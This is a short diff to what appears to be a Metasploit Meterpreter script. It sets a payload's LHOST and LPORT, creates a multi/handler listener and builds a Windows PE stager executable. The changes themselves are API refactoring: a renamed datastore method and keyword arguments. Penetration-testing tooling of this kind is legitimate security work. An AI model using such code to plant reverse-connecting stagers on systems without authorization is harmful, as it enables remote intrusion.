@@ -68,7 +68,7 @@ pay = client.framework.payloads.create(payload)
 pay.datastore['LHOST'] = rhost
 pay.datastore['LPORT'] = rport
 mul = client.framework.exploits.create("multi/handler")
-mul.share_datastore(pay.datastore)
+mul.share_data_store(pay.datastore)
 mul.datastore['WORKSPACE'] = client.workspace
 mul.datastore['PAYLOAD'] = payload
 mul.datastore['EXITFUNC'] = 'process'
@@ -85,7 +85,10 @@ if client.platform =~ /win32|win64/
 	print_status("Current server process: #{server.name} (#{server.pid})")
 
 	if ! inject
-		exe = ::Msf::Util::EXE.to_win32pe(client.framework, raw)
+		exe = ::Msf::Util::EXE.to_win32pe(
+        code: raw,
+        framework: client.framework
+    )
 		print_status("Meterpreter stager executable #{exe.length} bytes long")
 
 		#
